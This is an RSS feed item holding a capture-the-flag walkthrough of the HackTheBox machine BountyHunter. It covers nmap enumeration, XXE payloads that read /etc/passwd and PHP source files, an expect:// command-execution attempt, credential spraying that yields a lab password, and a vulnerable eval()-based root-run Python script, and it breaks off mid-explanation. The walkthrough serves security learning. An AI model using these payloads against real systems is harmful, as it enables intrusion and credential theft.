@@ -1,0 +1,269 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>machine on Yet, another infosec blog</title>
+    <link>/tags/machine/</link>
+    <description>Recent content in machine on Yet, another infosec blog</description>
+    <generator>Hugo -- gohugo.io</generator>
+    <language>en-us</language>
+    <lastBuildDate>Sun, 03 Oct 2021 09:30:00 +1345</lastBuildDate><atom:link href="/tags/machine/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>HackTheBox: BountyHunter</title>
+      <link>/posts/htb-bountyhunter/</link>
+      <pubDate>Sun, 03 Oct 2021 09:30:00 +1345</pubDate>
+      
+      <guid>/posts/htb-bountyhunter/</guid>
+      <description>Today, we are delving into BountyHunter as another HackTheBox machine in our sidetrack series.
+I hope you have a nice weekend and without further ado, let us jump right in!
+Enumeration Nmap output ┌──(kali㉿kali)-[~/Desktop/HTB/Boxes/BountyHunter] └─$ cat nmap/BountyHunter.nmap # Nmap 7.91 scan initiated Sat Oct 2 22:12:07 2021 as: nmap -sS -sV -sC -p- -v -oA nmap/BountyHunter 10.10.11.100 Nmap scan report for 10.10.11.100 Host is up (0.048s latency). Not shown: 65533 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.</description>
+      <content>&lt;p&gt;Today, we are delving into BountyHunter as another HackTheBox machine in our &lt;em&gt;sidetrack&lt;/em&gt; series.&lt;/p&gt;
+&lt;p&gt;I hope you have a nice weekend and without further ado, let us jump right in!&lt;/p&gt;
+&lt;h2 id=&#34;enumeration&#34;&gt;Enumeration&lt;/h2&gt;
+&lt;h3 id=&#34;nmap-output&#34;&gt;Nmap output&lt;/h3&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;┌──&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;kali㉿kali&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;-&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;~/Desktop/HTB/Boxes/BountyHunter&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
+└─$ cat nmap/BountyHunter.nmap 
+&lt;span style=&#34;color:#75715e&#34;&gt;# Nmap 7.91 scan initiated Sat Oct  2 22:12:07 2021 as: nmap -sS -sV -sC -p- -v -oA nmap/BountyHunter 10.10.11.100&lt;/span&gt;
+Nmap scan report &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; 10.10.11.100
+Host is up &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;0.048s latency&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;.
+Not shown: &lt;span style=&#34;color:#ae81ff&#34;&gt;65533&lt;/span&gt; closed ports
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;Ubuntu Linux; protocol 2.0&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
+| ssh-hostkey: 
+|   &lt;span style=&#34;color:#ae81ff&#34;&gt;3072&lt;/span&gt; d4:4c:f5:79:9a:79:a3:b0:f1:66:25:52:c9:53:1f:e1 &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;RSA&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
+|   &lt;span style=&#34;color:#ae81ff&#34;&gt;256&lt;/span&gt; a2:1e:67:61:8d:2f:7a:37:a7:ba:3b:51:08:e8:89:a6 &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;ECDSA&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
+|_  &lt;span style=&#34;color:#ae81ff&#34;&gt;256&lt;/span&gt; a5:75:16:d9:69:58:50:4a:14:11:7a:42:c1:b6:23:44 &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;ED25519&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
+80/tcp open  http    Apache httpd 2.4.41 &lt;span style=&#34;color:#f92672&#34;&gt;((&lt;/span&gt;Ubuntu&lt;span style=&#34;color:#f92672&#34;&gt;))&lt;/span&gt;
+|_http-favicon: Unknown favicon MD5: 556F31ACD686989B1AFCF382C05846AA
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+|_http-server-header: Apache/2.4.41 &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;Ubuntu&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
+|_http-title: Bounty Hunters
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Based on nmap result, Apache and SSH service were running on port 80 and 22, respectively.&lt;/p&gt;
+&lt;p&gt;The default index shows no conspicuous detail aside from its portal redirecting to a report form.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/legiahuyy/image-host/main/2021-10-03-HTB-BountyHunter/2021-10-03_15-34.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;Initially, several XSS/SQLi payloads were tested but displayed incapable of producing any useful result, albeit the input values seemed not to be filtered or sanitized for special characters.&lt;/p&gt;
+&lt;h2 id=&#34;exploitation&#34;&gt;Exploitation&lt;/h2&gt;
+&lt;h3 id=&#34;xml-eternal-entity&#34;&gt;XML Eternal Entity&lt;/h3&gt;
+&lt;p&gt;As the above solution is not possible, let us use BurpSuite to intercept requests and get a closer look.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/legiahuyy/image-host/main/2021-10-03-HTB-BountyHunter/2021-10-03_15-46.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;From here you can tell that the value of &lt;code&gt;data&lt;/code&gt; field is encoded, so I prefer using  &lt;a href=&#34;https://gchq.github.io/CyberChef/&#34;&gt;CyberChef&lt;/a&gt;, a powerful yet simple utility, to analyze and decode it.&lt;/p&gt;
+&lt;p&gt;Our recipe consists of &lt;strong&gt;URL Decode&lt;/strong&gt; and &lt;strong&gt;From Base64&lt;/strong&gt;, sequentially.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/legiahuyy/image-host/main/2021-10-03-HTB-BountyHunter/2021-10-03_15-48.png&#34; alt=&#34;Using Cyberchef to decode&#34;&gt;&lt;/p&gt;
+&lt;p&gt;The output is of XML and thereby allowing us to interfere and view files on the target server filesystem as well as other back-end sources or external entities that the server itself can access. This is an XXE injection, a type of attack against an application that parses XML input.&lt;/p&gt;
+&lt;p&gt;You can read more about XXE &lt;a href=&#34;https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing&#34;&gt;here&lt;/a&gt;.&lt;/p&gt;
+&lt;p&gt;Thanks to that, we can make an attempt to trigger the XXE vulnerability. The following payload includes and shows us the &lt;code&gt;/etc/passwd&lt;/code&gt; on the server.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-xml&#34; data-lang=&#34;xml&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&amp;lt;?xml  version=&amp;#34;1.0&amp;#34; encoding=&amp;#34;ISO-8859-1&amp;#34;?&amp;gt;&lt;/span&gt;
+&lt;span style=&#34;color:#75715e&#34;&gt;&amp;lt;!DOCTYPE foo [
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;  &amp;lt;!ELEMENT foo ANY &amp;gt;&lt;/span&gt;
+  &lt;span style=&#34;color:#75715e&#34;&gt;&amp;lt;!ENTITY xxe SYSTEM &amp;#34;file:///etc/passwd&amp;#34; &amp;gt;&lt;/span&gt;]&amp;gt;
+		&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;bugreport&amp;gt;&lt;/span&gt;
+		&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;title&amp;gt;&lt;/span&gt;&amp;amp;xxe;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;/title&amp;gt;&lt;/span&gt;
+		&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;cwe&amp;gt;&lt;/span&gt;x&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;/cwe&amp;gt;&lt;/span&gt;
+		&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;cvss&amp;gt;&lt;/span&gt;x&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;/cvss&amp;gt;&lt;/span&gt;
+		&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;reward&amp;gt;&lt;/span&gt;aaaa&amp;gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;/reward&amp;gt;&lt;/span&gt;
+		&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;/bugreport&amp;gt;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;And the return is:&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/legiahuyy/image-host/main/2021-10-03-HTB-BountyHunter/2021-10-03_15-50.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;In case the &lt;code&gt;expect://&lt;/code&gt; module is available on the target server then you can craft your payload as below and actually get RCE.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-xml&#34; data-lang=&#34;xml&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&amp;lt;?xml  version=&amp;#34;1.0&amp;#34; encoding=&amp;#34;ISO-8859-1&amp;#34;?&amp;gt;&lt;/span&gt;
+&lt;span style=&#34;color:#75715e&#34;&gt;&amp;lt;!DOCTYPE foo [
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;  &amp;lt;!ELEMENT foo ANY &amp;gt;&lt;/span&gt;
+  &lt;span style=&#34;color:#75715e&#34;&gt;&amp;lt;!ENTITY xxe SYSTEM &amp;#34;expect://ls&amp;#34; &amp;gt;&lt;/span&gt;]&amp;gt; &lt;span style=&#34;color:#75715e&#34;&gt;&amp;lt;!-- execute &amp;#34;ls&amp;#34; command --&amp;gt;&lt;/span&gt;
+		&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;bugreport&amp;gt;&lt;/span&gt;
+		&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;title&amp;gt;&lt;/span&gt;&amp;amp;xxe;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;/title&amp;gt;&lt;/span&gt;
+		&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;cwe&amp;gt;&lt;/span&gt;x&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;/cwe&amp;gt;&lt;/span&gt;
+		&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;cvss&amp;gt;&lt;/span&gt;x&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;/cvss&amp;gt;&lt;/span&gt;
+		&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;reward&amp;gt;&lt;/span&gt;aaaa&amp;gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;/reward&amp;gt;&lt;/span&gt;
+		&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;/bugreport&amp;gt;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Unfortunately, the result is just four empty fields, which indicates that &lt;code&gt;expect://&lt;/code&gt; is not loaded or this is a blind injection. Not really matter, though.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/legiahuyy/image-host/main/2021-10-03-HTB-BountyHunter/2021-10-03_15-51.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;We still have another solution of using a PHP wrapper to retrieve back-end files on the server. If you still remember, we have already &lt;a href=&#34;https://legiahuyy.github.io/blog/en/RFI-Wrapper/&#34;&gt;used it&lt;/a&gt; in one of my university challenges.&lt;/p&gt;
+&lt;p&gt;So our new payload is as following:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-xml&#34; data-lang=&#34;xml&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&amp;lt;?xml  version=&amp;#34;1.0&amp;#34; encoding=&amp;#34;ISO-8859-1&amp;#34;?&amp;gt;&lt;/span&gt;
+&lt;span style=&#34;color:#75715e&#34;&gt;&amp;lt;!DOCTYPE foo [
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;  &amp;lt;!ELEMENT foo ANY &amp;gt;&lt;/span&gt;
+  &lt;span style=&#34;color:#75715e&#34;&gt;&amp;lt;!ENTITY xxe SYSTEM &amp;#34;php://filter/convert.base64-encode/resource=index.php&amp;#34; &amp;gt;&lt;/span&gt;]&amp;gt;
+		&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;bugreport&amp;gt;&lt;/span&gt;
+		&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;title&amp;gt;&lt;/span&gt;&amp;amp;xxe;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;/title&amp;gt;&lt;/span&gt;
+		&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;cwe&amp;gt;&lt;/span&gt;x&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;/cwe&amp;gt;&lt;/span&gt;
+		&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;cvss&amp;gt;&lt;/span&gt;x&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;/cvss&amp;gt;&lt;/span&gt;
+		&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;reward&amp;gt;&lt;/span&gt;aaaa&amp;gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;/reward&amp;gt;&lt;/span&gt;
+		&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;/bugreport&amp;gt;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;It reads and encodes &lt;code&gt;index.php&lt;/code&gt; on the server to a base64 string.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/legiahuyy/image-host/main/2021-10-03-HTB-BountyHunter/2021-10-03_15-58.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;Yet it is just some HTML and CSS, nothing special so I have &lt;code&gt;gobuster&lt;/code&gt; enumerating &lt;code&gt;.php&lt;/code&gt; and other sensitive extensions.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/legiahuyy/image-host/main/2021-10-03-HTB-BountyHunter/2021-10-03_16-01.png&#34; alt=&#34;db.php&#34;&gt;&lt;/p&gt;
+&lt;p&gt;After retrieving &lt;code&gt;db.php&lt;/code&gt; and decoding the content, we have some credentials.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/legiahuyy/image-host/main/2021-10-03-HTB-BountyHunter/2021-10-03_16-04.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;But neither &lt;code&gt;test&lt;/code&gt; nor &lt;code&gt;admin&lt;/code&gt; was a valid username for SSH login, so I try looking for another user with console on the server system by searching for &lt;code&gt;/bin/bash&lt;/code&gt; or &lt;code&gt;/home/(username)&lt;/code&gt; in the &lt;code&gt;/etc/passwd&lt;/code&gt; file.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/legiahuyy/image-host/main/2021-10-03-HTB-BountyHunter/2021-10-03_16-08.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;There are just &lt;code&gt;root&lt;/code&gt; and &lt;code&gt;Development&lt;/code&gt;.&lt;/p&gt;
+&lt;h3 id=&#34;credentials-spraying-with-cme&#34;&gt;Credentials spraying with CME&lt;/h3&gt;
+&lt;p&gt;In this step, CrackMapExec (CME) should be able to help us get into the server internal. In order to work, CME needs two files containing all usernames and passwords (i.e, &lt;code&gt;user.txt&lt;/code&gt; and &lt;code&gt;pass.txt&lt;/code&gt;).&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/legiahuyy/image-host/main/2021-10-03-HTB-BountyHunter/2021-10-03_16-16.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;And the valid credentials are: &lt;code&gt;development:m19RoAU0hP41A1sTsq6K&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/legiahuyy/image-host/main/2021-10-03-HTB-BountyHunter/2021-10-03_16-18.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;h2 id=&#34;privilege-escalation&#34;&gt;Privilege Escalation&lt;/h2&gt;
+&lt;p&gt;To know whether &lt;code&gt;development&lt;/code&gt; user is capable of executing command as superuser or not, try &lt;code&gt;$ sudo -l&lt;/code&gt;:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;development@bountyhunter:~$ sudo -l
+Matching Defaults entries &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; development on
+    bountyhunter:
+    env_reset, mail_badpass,
+    secure_path&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;/usr/local/sbin&lt;span style=&#34;color:#ae81ff&#34;&gt;\:&lt;/span&gt;/usr/local/bin&lt;span style=&#34;color:#ae81ff&#34;&gt;\:&lt;/span&gt;/usr/sbin&lt;span style=&#34;color:#ae81ff&#34;&gt;\:&lt;/span&gt;/usr/bin&lt;span style=&#34;color:#ae81ff&#34;&gt;\:&lt;/span&gt;/sbin&lt;span style=&#34;color:#ae81ff&#34;&gt;\:&lt;/span&gt;/bin&lt;span style=&#34;color:#ae81ff&#34;&gt;\:&lt;/span&gt;/snap/bin
+
+User development may run the following commands on
+        bountyhunter:
+    &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;root&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; NOPASSWD: /usr/bin/python3.8
+        /opt/skytrain_inc/ticketValidator.py
+
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;As can be seen, &lt;code&gt;development&lt;/code&gt; can execute &lt;code&gt;/usr/bin/python3.8 /opt/skytrain_inc/ticketValidator.py&lt;/code&gt; as root without password.&lt;/p&gt;
+&lt;h3 id=&#34;eval--evil&#34;&gt;Eval() == Evil&lt;/h3&gt;
+&lt;p&gt;Reading &lt;code&gt;/opt/skytrain_inc/ticketValidator.py&lt;/code&gt; source.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#Skytrain Inc Ticket Validation System 0.1&lt;/span&gt;
+&lt;span style=&#34;color:#75715e&#34;&gt;#Do not distribute this file.&lt;/span&gt;
+
+&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;load_file&lt;/span&gt;(loc):
+    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; loc&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;endswith(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;.md&amp;#34;&lt;/span&gt;):
+        &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; open(loc, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;r&amp;#39;&lt;/span&gt;)
+    &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt;:
+        print(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Wrong file type.&amp;#34;&lt;/span&gt;)
+        exit()
+
+&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;evaluate&lt;/span&gt;(ticketFile):
+    &lt;span style=&#34;color:#75715e&#34;&gt;#Evaluates a ticket to check for ireggularities.&lt;/span&gt;
+    code_line &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;None&lt;/span&gt;
+    &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; i,x &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; enumerate(ticketFile&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;readlines()):
+        &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;:
+            &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;not&lt;/span&gt; x&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;startswith(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;# Skytrain Inc&amp;#34;&lt;/span&gt;):
+                &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;False&lt;/span&gt;
+            &lt;span style=&#34;color:#66d9ef&#34;&gt;continue&lt;/span&gt;
+        &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;:
+            &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;not&lt;/span&gt; x&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;startswith(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;## Ticket to &amp;#34;&lt;/span&gt;):
+                &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;False&lt;/span&gt;
+            print(&lt;span style=&#34;color:#e6db74&#34;&gt;f&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Destination: &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39; &amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;join(x&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;strip()&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;split(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39; &amp;#39;&lt;/span&gt;)[&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;:])&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;)
+            &lt;span style=&#34;color:#66d9ef&#34;&gt;continue&lt;/span&gt;
+
+        &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; x&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;startswith(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;__Ticket Code:__&amp;#34;&lt;/span&gt;):
+            code_line &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; i&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;
+            &lt;span style=&#34;color:#66d9ef&#34;&gt;continue&lt;/span&gt;
+
+        &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; code_line &lt;span style=&#34;color:#f92672&#34;&gt;and&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; code_line:
+            &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;not&lt;/span&gt; x&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;startswith(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;**&amp;#34;&lt;/span&gt;):
+                &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;False&lt;/span&gt;
+            ticketCode &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; x&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;replace(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;**&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;split(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;+&amp;#34;&lt;/span&gt;)[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;]
+            &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; int(ticketCode) &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;:
+                validationNumber &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; eval(x&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;replace(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;**&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;))
+                &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; validationNumber &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;100&lt;/span&gt;:
+                    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;True&lt;/span&gt;
+                &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt;:
+                    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;False&lt;/span&gt;
+    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;False&lt;/span&gt;
+
+&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;main&lt;/span&gt;():
+    fileName &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; input(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Please enter the path to the ticket file.&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;)
+    ticket &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; load_file(fileName)
+    &lt;span style=&#34;color:#75715e&#34;&gt;#DEBUG print(ticket)&lt;/span&gt;
+    result &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; evaluate(ticket)
+    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (result):
+        print(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Valid ticket.&amp;#34;&lt;/span&gt;)
+    &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt;:
+        print(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Invalid ticket.&amp;#34;&lt;/span&gt;)
+    ticket&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;close
+
+main()
+
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Code breakdown:&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;load_file&lt;/code&gt; checks whether the file extension is &lt;code&gt;.md&lt;/code&gt; or not.&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;evaluate&lt;/code&gt;&lt;/p&gt;
+&lt;ul&gt;
